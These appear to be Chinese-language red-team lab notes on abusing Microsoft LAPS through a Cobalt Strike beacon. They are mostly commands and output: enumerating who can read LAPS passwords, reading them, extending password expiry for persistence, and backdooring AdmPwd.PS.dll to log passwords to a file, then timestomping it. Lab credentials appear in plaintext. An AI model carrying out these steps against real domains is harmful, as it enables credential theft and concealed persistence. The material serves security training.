# Local Administrator Password Solution

如果有LAPS，那么硬盘上会有这个文件：AdmPwd.dll 

```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 24 bytes
[*] You are DEV\bfarmer
beacon> ls C:\Program Files\LAPS\CSE
[*] Tasked beacon to list files in C:\Program Files\LAPS\CSE
[+] host called home, sent: 43 bytes
[*] Listing: C:\Program Files\LAPS\CSE\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 145kb    fil     09/22/2016 08:02:08   AdmPwd.dll
```


查找跟LAPS有关的GPO
```
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[+] host called home, sent: 145560 bytes
beacon> powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
[*] Tasked beacon to run: Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
[+] host called home, sent: 537 bytes
[+] received output:
#< CLIXML


displayname    : LAPS
name           : {5A20DA0D-2710-4FF6-A19C-AE9EE5712BE7}
gpcfilesyspath : \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5A20DA0D-2710-4FF6-A19C-AE9EE5712BE7}

```

搜索```ms-Mcs-AdmPwdExpirationTime```属性不为空的计算机对象（任何域用户都可以读取此属性）

```
beacon> powershell Get-DomainObject -SearchBase "LDAP://DC=dev,DC=cyberbotic,DC=io" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
[*] Tasked beacon to run: Get-DomainObject -SearchBase "LDAP://DC=dev,DC=cyberbotic,DC=io" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
[+] host called home, sent: 633 bytes
[+] received output:
#< CLIXML

dnshostname              
-----------              
wkstn-1.dev.cyberbotic.io
wkstn-2.dev.cyberbotic.io

```

根据上面枚举的gpcfilesyspath下载Registry.pol这个文件

```
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5A20DA0D-2710-4FF6-A19C-AE9EE5712BE7}\Machine
[*] Tasked beacon to list files in \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5A20DA0D-2710-4FF6-A19C-AE9EE5712BE7}\Machine
[+] host called home, sent: 118 bytes
[*] Listing: \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5A20DA0D-2710-4FF6-A19C-AE9EE5712BE7}\Machine\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     03/25/2021 10:35:38   Preferences
          dir     03/25/2021 10:34:26   Scripts
 575b     fil     03/25/2021 10:33:46   comment.cmtx
 746b     fil     03/25/2021 10:33:46   Registry.pol

beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5A20DA0D-2710-4FF6-A19C-AE9EE5712BE7}\Machine\Registry.pol
[*] Tasked beacon to download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5A20DA0D-2710-4FF6-A19C-AE9EE5712BE7}\Machine\Registry.pol
[+] host called home, sent: 121 bytes
[*] started download of \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5A20DA0D-2710-4FF6-A19C-AE9EE5712BE7}\Machine\Registry.pol (746 bytes)
[*] download of Registry.pol is complete
```

同步到CS客户端，分析这个文件


```
PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol


KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordComplexity
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 3

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordLength
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 14

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordAgeDays
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 7

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdminAccountName
ValueType   : REG_SZ
ValueLength : 20
ValueData   : lapsadmin

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdmPwdEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1

```

1661470790012.png



有LAPS的电脑一般预装了LAPS PowerShell cmdlets ，上面枚举到wkstn-1和wkstn-2两台电脑都有



搜索**AdmPwd**相关的命令


在wkstn-1

```
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
wkstn-1

beacon> powershell Get-Command *AdmPwd*
[*] Tasked beacon to run: Get-Command *AdmPwd*
[+] host called home, sent: 325 bytes
[+] received output:
#< CLIXML

CommandType     Name                                               Version    Source                                   
-----------     ----                                               -------    ------                                   
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS                                
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS                                
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS                                
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS                                
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS                                
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS                                
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS                                
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS  
```




在wkstn-2
```
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
wkstn-2

beacon> powershell Get-Command *AdmPwd*
[*] Tasked beacon to run: Get-Command *AdmPwd*
[+] host called home, sent: 119 bytes
[+] received output:
#< CLIXML

CommandType     Name                                               Version    Source                                   
-----------     ----                                               -------    ------                                   
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS                                
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS                                
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS                                
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS                                
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS                                
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS                                
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS                                
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS   
```


假如在srv-1上运行上面命令,无任何显示
```
beacon> powershell Get-Command *AdmPwd*
[*] Tasked beacon to run: Get-Command *AdmPwd*
[+] host called home, sent: 119 bytes
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
srv-1

```



```Find-AdmPwdExtendedRights```将列出允许读取给定 OU 中机器的 LAPS 密码的主体

我这里的输出跟教材不一样，会报一个错
```
beacon> powershell Find-AdmPwdExtendedRights -Identity Workstations | fl
[*] Tasked beacon to run: Find-AdmPwdExtendedRights -Identity Workstations | fl
[+] host called home, sent: 207 bytes
[+] received output:
#< CLIXML


Name              : Workstations
DistinguishedName : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Status            : Delegated

Name              : Workstations
DistinguishedName : OU=Workstations,DC=cyberbotic,DC=io
Status            : Delegated

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Searching UNC share \\dc-2\home$\nlamb\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD>Searching UNC share \\dc-2\home$\nlamb\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="2"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="3"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Searching UNC share \\dc-2\home$\nlamb\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="4"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD>Searching UNC share \\dc-2\home$\nlamb\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="5"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">Find-AdmPwdExtendedRights : More than one object found, search using distinguishedName instead_x000D__x000A_</S><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ Find-AdmPwdExtendedRights -Identity Workstations | fl_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : NotSpecified: (:) [Find-AdmPwdExtendedRights], AmbiguousResultException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : AdmPwd.PSTypes.AmbiguousResultException,AdmPwd.PS.FindExtendedRights_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
wkstn-2

beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are DEV\nlamb
```

教材的输出是：
```
beacon> run hostname
wkstn-2

beacon> getuid
[*] You are DEV\nlamb

beacon> powershell Find-AdmPwdExtendedRights -Identity Workstations | fl

ObjectDN             : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ExtendedRightHolders : {NT AUTHORITY\SYSTEM, DEV\Domain Admins, DEV\1st Line Support}
```

NT AUTHORITY\SYSTEM, DEV\Domain Admins, DEV\1st Line Support三个组都有权限读取指定OU的密码

DEV\nlamb在DEV\Domain Admins，所以有权读取

```
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
wkstn-2

beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are DEV\nlamb
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl
[*] Tasked beacon to run: Get-AdmPwdPassword -ComputerName wkstn-2 | fl
[+] host called home, sent: 183 bytes
[+] received output:
#< CLIXML


ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : fk43i9785W8Cw5
ExpirationTimestamp : 8/28/2022 8:58:44 AM

```

1661471925451.png


 DEV\bfarmer不在上面三个组的任何一个，所以读取的时候密码是空的
```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 20 bytes
[*] You are DEV\bfarmer
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 38 bytes
[+] received output:
wkstn-1

beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl
[*] Tasked beacon to run: Get-AdmPwdPassword -ComputerName wkstn-2 | fl
[+] host called home, sent: 405 bytes
[+] received output:
#< CLIXML


ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : 
ExpirationTimestamp : 8/28/2022 8:58:44 AM

```

1661471899909.png

jking在DEV\1st Line Support组

1661472073529.png


在WKSTN-2上make_token以后也可以看到密码
```
beacon> make_token DEV\jking Purpl3Drag0n
[*] Tasked beacon to create a token for DEV\jking
[+] host called home, sent: 40 bytes
[+] Impersonated DEV\nlamb
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl
[*] Tasked beacon to run: Get-AdmPwdPassword -ComputerName wkstn-2 | fl
[+] host called home, sent: 183 bytes
[+] received output:
#< CLIXML


ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : fk43i9785W8Cw5
ExpirationTimestamp : 8/28/2022 8:58:44 AM

```

1661472378476.png

但是在在WKSTN-1上make_token以后会报错，理论上应该也可以看到的，感觉lab不太稳定?

1661472458881.png


使用上面得到的计算机密码，make_token，访问目标计算机

```
beacon> rev2self
[*] Tasked beacon to revert token
[+] host called home, sent: 20 bytes
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 38 bytes
[+] received output:
wkstn-1

beacon> ls \\wkstn-2\c$
[*] Tasked beacon to list files in \\wkstn-2\c$
[+] host called home, sent: 42 bytes
[-] could not open \\wkstn-2\c$\*: 5
beacon> make_token .\lapsadmin fk43i9785W8Cw5
[*] Tasked beacon to create a token for .\lapsadmin
[+] host called home, sent: 56 bytes
[+] Impersonated DEV\bfarmer
beacon> ls \\wkstn-2\c$
[*] Tasked beacon to list files in \\wkstn-2\c$
[+] host called home, sent: 42 bytes
[*] Listing: \\wkstn-2\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 14:35:19   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 15:43:43   Program Files
          dir     02/16/2022 12:46:57   Program Files (x86)
          dir     08/17/2022 23:31:12   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/19/2021 14:45:10   System Volume Information
          dir     05/05/2021 16:13:00   Users
          dir     08/13/2022 01:01:57   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     08/25/2022 23:21:22   pagefile.sys
```
1661472563036.png



假如不能使用LAPS的powershell工具集（假设本机未启用LAPS，当前用户也无权访问启用LAPS的机器），使用powershell在任何一台机器上可以起到与上面等价的枚举操作

```
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[+] host called home, sent: 145560 bytes
beacon> powershell Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | select ObjectDN, SecurityIdentifier
[*] Tasked beacon to run: Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | select ObjectDN, SecurityIdentifier
[+] host called home, sent: 893 bytes
[+] received output:
#< CLIXML

ObjectDN                                              SecurityIdentifier       
--------                                              ------------------       
OU=Workstations,DC=dev,DC=cyberbotic,DC=io            S-1-5-21-3263068140-20...
CN=WKSTN-1,OU=Workstations,DC=dev,DC=cyberbotic,DC=io S-1-5-21-3263068140-20...
CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io S-1-5-21-3263068140-20...


<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
[*] Tasked beacon to run: ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
[+] host called home, sent: 433 bytes
[+] received output:
#< CLIXML
DEV\1st Line Support
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
beacon> make_token DEV\jking Purpl3Drag0n
[*] Tasked beacon to create a token for DEV\jking
[+] host called home, sent: 40 bytes
[+] Impersonated NT AUTHORITY\SYSTEM
beacon> powershell Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
[*] Tasked beacon to run: Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
[+] host called home, sent: 433 bytes
[+] received output:
#< CLIXML

ms-mcs-admpwd 
------------- 
fk43i9785W8Cw5


```

1661473011405.png


# LAPS Persistence

原理是通过延长密码的有效期达到长期控制的目的，此操作需要system权限

升级到system权限
```
beacon> elevate svc-exe tcp
[*] Tasked beacon to run windows/beacon_bind_tcp (0.0.0.0:4444) via Service Control Manager (\\127.0.0.1\ADMIN$\ed40c83.exe)
[+] host called home, sent: 315466 bytes
[+] received output:
Started service ed40c83 on .
[+] established link to child beacon: 10.10.17.132
```

设置密码过期时间到2338年
```
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[+] host called home, sent: 145560 bytes
beacon> powershell Get-DomainObject -Identity wkstn-2 -Properties ms-mcs-admpwdexpirationtime
[*] Tasked beacon to run: Get-DomainObject -Identity wkstn-2 -Properties ms-mcs-admpwdexpirationtime
[+] host called home, sent: 465 bytes
[+] received output:
#< CLIXML

ms-mcs-admpwdexpirationtime
---------------------------
         232609935231523081


<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
wkstn-2

beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are NT AUTHORITY\SYSTEM (admin)
beacon> powershell Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
[*] Tasked beacon to run: Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
[+] host called home, sent: 521 bytes
[+] received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl
[*] Tasked beacon to run: Get-AdmPwdPassword -ComputerName wkstn-2 | fl
[+] host called home, sent: 393 bytes
[+] received output:
#< CLIXML


ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : 
ExpirationTimestamp : 2/11/2338 11:05:23 AM


```


1661474217831.png



# LAPS Backdoors

LAPS后门，主要通过修改PowerShell cmdlet里的方法，当管理员进行操作时，我们会得到一个密码的副本

查看PowerShell cmdlet所在文件夹

```
beacon> cd C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS
[*] cd C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS
[+] host called home, sent: 128 bytes
beacon> ls
[*] Tasked beacon to list files in .
[+] host called home, sent: 79 bytes
[*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     05/05/2021 16:14:39   en-US
 30kb     fil     09/23/2016 00:38:16   AdmPwd.PS.dll
 5kb      fil     08/23/2016 14:40:58   AdmPwd.PS.format.ps1xml
 4kb      fil     08/23/2016 14:40:58   AdmPwd.PS.psd1
 33kb     fil     09/22/2016 08:02:08   AdmPwd.Utils.dll
```

1661474490204.png


修改这个文件

1661474660596.png


找到Main/AdmPwd.PS/Main.cs里的这个方法
```
[Cmdlet("Get", "AdmPwdPassword")]
public class GetPassword : Cmdlet
{
    [Parameter(Mandatory = true, Position = 0, ValueFromPipeline = true)]
    public String ComputerName;

    protected override void ProcessRecord()
    {
        foreach (string dn in DirectoryUtils.GetComputerDN(ComputerName))
        {
            PasswordInfo pi = DirectoryUtils.GetPasswordInfo(dn);
            WriteObject(pi);
        }
    }
}
```

1661474867370.png

添加这两行代码,当操作获取密码的命令时，把当前密码写文件到```C:\Temp\LAPS.txt```
```
var line = $"{pi.ComputerName} : {pi.Password}";
System.IO.File.AppendAllText(@"C:\Temp\LAPS.txt", line);
```
1661474940637.png


上面保存，编译生成一个AdmPwd.PS.dll文件

1661475080201.png

替换源文件，这里如果报进程占用要kill掉进程或者重启计算机

1661475846601.png

同步时间戳
```
beacon> cd C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\
[*] cd C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\
[+] host called home, sent: 69 bytes
beacon> timestomp AdmPwd.PS.dll AdmPwd.PS.psd1
[*] Tasked beacon to timestomp AdmPwd.PS.dll to AdmPwd.PS.psd1
[+] host called home, sent: 1110 bytes
beacon> ls
[*] Tasked beacon to list files in .
[+] host called home, sent: 19 bytes
[*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     05/05/2021 16:14:39   en-US
 16kb     fil     08/23/2016 14:40:58   AdmPwd.PS.dll
 5kb      fil     08/23/2016 14:40:58   AdmPwd.PS.format.ps1xml
 4kb      fil     08/23/2016 14:40:58   AdmPwd.PS.psd1
 33kb     fil     09/22/2016 08:02:08   AdmPwd.Utils.dll
```

1661476576319.png


